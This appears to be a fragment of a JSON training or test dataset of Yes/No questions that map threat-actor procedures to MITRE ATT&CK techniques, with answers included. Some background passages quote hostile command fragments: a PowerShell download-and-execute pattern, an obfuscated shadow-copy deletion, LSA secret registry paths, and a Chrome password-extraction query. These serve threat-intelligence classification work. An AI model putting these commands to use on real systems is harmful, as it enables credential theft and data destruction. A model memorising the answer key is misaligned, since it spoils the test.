    "instruction": "Background OS Credential Dumping: LSA Secrets: Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts. LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets</code>. LSA secrets can also be dumped from memory.\n\nReg can be used to extract from the Registry. Mimikatz can be used to extract secrets from memory..\nQ: Is procedure IceApple's Credential Dumper module can dump LSA secrets from registry keys, including: `HKLM\\SECURITY\\Policy\\PolEKList\\default`, `HKLM\\SECURITY\\Policy\\Secrets\\*\\CurrVal`, and `HKLM\\SECURITY\\Policy\\Secrets\\*\\OldVal`.  related to technique System Information Discovery.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "OS Credential Dumping: LSA Secrets: Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts. LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets</code>. LSA secrets can also be dumped from memory.\n\nReg can be used to extract from the Registry. Mimikatz can be used to extract secrets from memory.",
      "question": "Is procedure IceApple's Credential Dumper module can dump LSA secrets from registry keys, including: `HKLM\\SECURITY\\Policy\\PolEKList\\default`, `HKLM\\SECURITY\\Policy\\Secrets\\*\\CurrVal`, and `HKLM\\SECURITY\\Policy\\Secrets\\*\\OldVal`.  related to technique System Information Discovery",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Archive Collected Data: Archive via Library: An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including Python rarfile , libzip , and zlib . Most libraries include functionality to encrypt and/or compress data.\n\nSome archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism..\nQ: Is procedure InvisiMole can use zlib to compress and decompress data.  related to technique Obfuscated Files or Information: Indicator Removal from Tools.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is correlated with Archive Collected Data: Archive via Library",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Archive Collected Data: Archive via Library: An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including Python rarfile , libzip , and zlib . Most libraries include functionality to encrypt and/or compress data.\n\nSome archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.",
      "question": "Is procedure InvisiMole can use zlib to compress and decompress data.  related to technique Obfuscated Files or Information: Indicator Removal from Tools",
      "yes/no": "No.\nThe provided context is correlated with Archive Collected Data: Archive via Library",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Ingress Tool Transfer: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine..\nAnswer in Yes or No.\n\nQuestion: Is procedure During Night Dragon, threat actors used administrative utilities to deliver Trojan components to remote systems.  related to technique Data Staged: Remote Data Staging",
    "context": "",
    "output": "No.\nThe provided context is related to Ingress Tool Transfer",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Ingress Tool Transfer: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "question": "Is procedure During Night Dragon, threat actors used administrative utilities to deliver Trojan components to remote systems.  related to technique Data Staged: Remote Data Staging",
      "yes/no": "No.\nThe provided context is related to Ingress Tool Transfer",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure ComRAT has used encryption and base64 to obfuscate its orchestrator code in the Registry. ComRAT has also used encoded PowerShell scripts.  related to technique Boot or Logon Autostart Execution: Security Support Provider.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is related to Obfuscated Files or Information: Command Obfuscation",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Obfuscated Files or Information: Command Obfuscation: Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., Phishing and Drive-by Compromise) or interactively via Command and Scripting Interpreter.\n\nFor example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality. Many languages support built-in obfuscation in the form of base64 or URL encoding. Adversaries may also manually implement command obfuscation via string splitting (`\u201cWor\u201d+\u201cd.Application\u201d`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.\n\nAdversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`).\n\nTools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.",
      "question": "Is procedure ComRAT has used encryption and base64 to obfuscate its orchestrator code in the Registry. ComRAT has also used encoded PowerShell scripts.  related to technique Boot or Logon Autostart Execution: Security Support Provider",
      "yes/no": "No.\nThe provided context is related to Obfuscated Files or Information: Command Obfuscation",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure During the 2015 Ukraine Electric Power Attack, Sandworm Team modified in-registry Internet settings to lower internet security before launching `rundll32.exe`, which in-turn launches the malware and communicates with C2 servers over the Internet. .  related to technique Modify Registry",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Modify Registry: Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
      "question": "Is procedure During the 2015 Ukraine Electric Power Attack, Sandworm Team modified in-registry Internet settings to lower internet security before launching `rundll32.exe`, which in-turn launches the malware and communicates with C2 servers over the Internet. .  related to technique Modify Registry",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure SUNSPOT encrypted log entries it collected with the stream cipher RC4 using a hard-coded key. It also uses AES128-CBC encrypted blobs for SUNBURST source code and data extracted from the SolarWinds Orion <MsBuild.exe</code> process. a type of technique External Remote Services",
    "context": "",
    "output": "No.\nThe correct answer is Obfuscated Files or Information",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Obfuscated Files or Information: Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \n\nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.",
      "question": "Is procedure SUNSPOT encrypted log entries it collected with the stream cipher RC4 using a hard-coded key. It also uses AES128-CBC encrypted blobs for SUNBURST source code and data extracted from the SolarWinds Orion <MsBuild.exe</code> process. a type of technique External Remote Services",
      "yes/no": "No.\nThe correct answer is Obfuscated Files or Information",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Deobfuscate/Decode Files or Information: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary..\nQ: Is procedure Darkhotel has decrypted strings and imports using RC4 during execution. a type of technique Deobfuscate/Decode Files or Information.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Deobfuscate/Decode Files or Information: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
      "question": "Is procedure Darkhotel has decrypted strings and imports using RC4 during execution. a type of technique Deobfuscate/Decode Files or Information",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Command and Scripting Interpreter: Visual Basic: Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads (which may also involve Mark-of-the-Web Bypass to enable execution)..\nAnswer in Yes or No.\n\nQuestion: Is procedure SideCopy has sent Microsoft Office Publisher documents to victims that have embedded malicious macros that execute an hta file via calling `mshta.exe`. a type of technique Command and Scripting Interpreter: Visual Basic",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: Visual Basic: Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads (which may also involve Mark-of-the-Web Bypass to enable execution).",
      "question": "Is procedure SideCopy has sent Microsoft Office Publisher documents to victims that have embedded malicious macros that execute an hta file via calling `mshta.exe`. a type of technique Command and Scripting Interpreter: Visual Basic",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background External Remote Services: Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management and VNC can also be used externally.\n\nAccess to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard..\nAnswer in Yes or No.\n\nQuestion: Is procedure During C0027, Scattered Spider used Citrix and VPNs to persist in compromised environments.  related to technique Application Layer Protocol: Mail Protocols",
    "context": "",
    "output": "No.\nThe provided context is correlated with External Remote Services",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "External Remote Services: Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management and VNC can also be used externally.\n\nAccess to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.",
      "question": "Is procedure During C0027, Scattered Spider used Citrix and VPNs to persist in compromised environments.  related to technique Application Layer Protocol: Mail Protocols",
      "yes/no": "No.\nThe provided context is correlated with External Remote Services",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure BLUELIGHT can uninstall itself. a type of technique Obfuscated Files or Information.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is correlated with Indicator Removal: File Deletion",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Indicator Removal: File Deletion: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "question": "Is procedure BLUELIGHT can uninstall itself. a type of technique Obfuscated Files or Information",
      "yes/no": "No.\nThe provided context is correlated with Indicator Removal: File Deletion",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Input Capture: Web Portal Capture: Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\n\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through External Remote Services and Valid Accounts or as part of the initial compromise by exploitation of the externally facing web service..\nAnswer in Yes or No.\n\nQuestion: Is procedure The IceApple OWA credential logger can monitor for OWA authentication requests and log the credentials. a type of technique Input Capture: Web Portal Capture",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Input Capture: Web Portal Capture: Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\n\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through External Remote Services and Valid Accounts or as part of the initial compromise by exploitation of the externally facing web service.",
      "question": "Is procedure The IceApple OWA credential logger can monitor for OWA authentication requests and log the credentials. a type of technique Input Capture: Web Portal Capture",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Credentials from Password Stores: Credentials from Web Browsers: Adversaries may acquire credentials from web browsers by reading files specific to the target browser. Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim\u2019s cached logon credentials as the decryption key.\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the Windows Credential Manager.\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator)..\nQ: Is procedure Javali can capture login credentials from open browsers including Firefox, Chrome, Internet Explorer, and Edge. a type of technique Shared Modules.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe correct answer is Credentials from Password Stores: Credentials from Web Browsers",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Credentials from Password Stores: Credentials from Web Browsers: Adversaries may acquire credentials from web browsers by reading files specific to the target browser. Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim\u2019s cached logon credentials as the decryption key.\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the Windows Credential Manager.\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
      "question": "Is procedure Javali can capture login credentials from open browsers including Firefox, Chrome, Internet Explorer, and Edge. a type of technique Shared Modules",
      "yes/no": "No.\nThe correct answer is Credentials from Password Stores: Credentials from Web Browsers",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background System Owner/User Discovery: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device..\nAnswer in Yes or No.\n\nQuestion: Is procedure Cryptoistic can gather data on the user of a compromised host. a type of technique System Owner/User Discovery",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Owner/User Discovery: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
      "question": "Is procedure Cryptoistic can gather data on the user of a compromised host. a type of technique System Owner/User Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Obfuscated Files or Information: Binary Padding: Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \n\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures. The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware. Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed..\nAnswer in Yes or No.\n\nQuestion: Is procedure Gamaredon Group has obfuscated .NET executables by inserting junk code. a type of technique Remote System Discovery",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Obfuscated Files or Information: Binary Padding: Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \n\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures. The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware. Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.",
      "question": "Is procedure Gamaredon Group has obfuscated .NET executables by inserting junk code. a type of technique Remote System Discovery",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Boot or Logon Autostart Execution: Shortcut Modification: Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence. Although often used as payloads in an infection chain (e.g. Spearphishing Attachment), adversaries may also create a new shortcut as a means of indirection, while also abusing Masquerading to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\n\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. Browser Extensions) to persistently launch malware..\nAnswer in Yes or No.\n\nQuestion: Is procedure Astaroth's initial payload is a malicious .LNK file.  related to technique Boot or Logon Autostart Execution: Shortcut Modification",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Boot or Logon Autostart Execution: Shortcut Modification: Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence. Although often used as payloads in an infection chain (e.g. Spearphishing Attachment), adversaries may also create a new shortcut as a means of indirection, while also abusing Masquerading to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\n\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. Browser Extensions) to persistently launch malware.",
      "question": "Is procedure Astaroth's initial payload is a malicious .LNK file.  related to technique Boot or Logon Autostart Execution: Shortcut Modification",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure APT32's macOS backdoor hides the clientID file via a chflags function. a type of technique Create Account: Local Account.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is correlated with Hide Artifacts: Hidden Files and Directories",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Hide Artifacts: Hidden Files and Directories: Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls \u2013a</code> for Linux and macOS).\n\nOn Linux and Mac, users can mark specific files as hidden simply by putting a \u201c.\u201d as the first character in the file or folder name   . Files and folders that start with a period, \u2018.\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \u201cls\u201d. Users must specifically change settings to have these files viewable.\n\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn\u2019t clutter up the user\u2019s workspace. For example, SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019s known hosts and keys.\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
      "question": "Is procedure APT32's macOS backdoor hides the clientID file via a chflags function. a type of technique Create Account: Local Account",
      "yes/no": "No.\nThe provided context is correlated with Hide Artifacts: Hidden Files and Directories",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
